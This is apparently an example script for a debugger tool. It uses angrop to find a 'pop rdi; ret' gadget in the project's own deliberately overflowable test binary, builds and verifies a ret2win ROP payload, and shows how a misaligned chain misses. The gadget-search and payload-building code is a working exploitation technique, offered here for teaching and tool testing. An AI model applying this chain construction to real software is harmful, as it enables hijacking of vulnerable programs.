"""ROP loop demo: find a gadget with angrop, land a ret2win chain, verify.

Launches the overflowable target, stops at main (before the read), scans
gadgets with angrop (content-keyed cache), builds the ret2win payload from the
found ``pop rdi; ret`` gadget, writes it to an input file, and verifies the
landing. Then demonstrates the relaunch loop: a deliberately misaligned chain
is reported as a miss with the actual PC, the corrected chain lands.

The payload rides on a file instead of stdin: mydbg launches with a pty whose
canonical line discipline corrupts binary payloads.

Run standalone:

    ./build/dev/mydbg --headless-script examples/rop_crackme.py
"""

from __future__ import annotations

import os
import tempfile
from pathlib import Path

from mydbg import rop

WIN_TOKEN = 0xC0DEC0DE
# The compiler gives the 32-byte buffer a 48-byte aligned slot (rbp-0x30);
# the saved rbp occupies 8 more, so the return address is at offset 56.
RET_OFFSET = 0x30 + 8


def target_path() -> str:
    configured = os.environ.get("MYDBG_SYMBOLIC_TARGET")
    if configured:
        return configured
    repository_build = (Path(__file__).resolve().parents[1] / "build" /
                        "debuggee_rop_target")
    if repository_build.is_file():
        return str(repository_build)
    raise RuntimeError(
        "debuggee_rop_target was not found; build it or set MYDBG_SYMBOLIC_TARGET"
    )


def build_payload(engine: rop.RopEngine, win: int, token: int, *, shift: int = 0) -> bytes:
    matches = engine.find_gadgets_matching("pop rdi ; ret", exact=True)
    if not matches:
        # Fall back to any pop-rdi gadget; prefer the smallest stack change so
        # the chain stays predictable.
        matches = engine.find_gadgets_matching("pop rdi")
        if not matches:
            raise RuntimeError("no pop rdi gadget found")
        matches.sort(key=lambda gadget: gadget.stack_change)
    gadget = matches[0]
    print(f"[+] gadget: {engine.gadget_summary(gadget)}")
    payload = bytearray(b"A" * (RET_OFFSET + shift))
    payload += rop.p64(gadget.addr)
    payload += rop.p64(token)
    payload += rop.p64(win)
    return bytes(payload)


def run(dbg):
    if not rop._import_angr:  # noqa: SLF001 - cheap liveness check
        raise RuntimeError(rop.BOOTSTRAP_HINT)
    executable = target_path()

    # Launch first: breakpoint placement is only address-resolved once the
    # session has a live stop to anchor symbols against.
    process = dbg.launch([executable, "/dev/null"], stop_at="main", timeout=15)
    win = rop.resolve_symbol(dbg, "rop_win")
    print(f"[+] rop_win at {win:#x}")

    engine = rop.RopEngine(executable)
    engine.find_gadgets()
    print(engine.summary(limit=8))

    with tempfile.TemporaryDirectory(prefix="mydbg-rop-") as workdir:
        aligned_path = str(Path(workdir) / "aligned.bin")
        shifted_path = str(Path(workdir) / "shifted.bin")
        Path(aligned_path).write_bytes(build_payload(engine, win, WIN_TOKEN))
        Path(shifted_path).write_bytes(
            build_payload(engine, win, WIN_TOKEN, shift=1))

        config = rop.RunConfig(argv=[executable, aligned_path], stop_at="main")
        landing = rop.test_landing(
            dbg, config, Path(aligned_path).read_bytes(), 0,
            send_stdin=False, expect_output=b"rop_win_ok", expect_exit=0,
        )
        print(landing.summary())
        if not landing.landed:
            raise RuntimeError("the ret2win chain did not land")

        # The relaunch loop: a misaligned chain misses; the report shows where
        # it actually landed so the offset can be corrected from the debugger.
        shifted_config = rop.RunConfig(argv=[executable, shifted_path],
                                       stop_at="main")
        shifted = rop.test_landing(
            dbg, shifted_config, Path(shifted_path).read_bytes(), 0,
            send_stdin=False, expect_output=b"rop_win_ok", expect_exit=0,
        )
        print(shifted.summary())
        if shifted.landed:
            raise RuntimeError("the misaligned chain unexpectedly landed")
    print("[+] rop-loop-ok misaligned chain rejected, aligned chain landed")
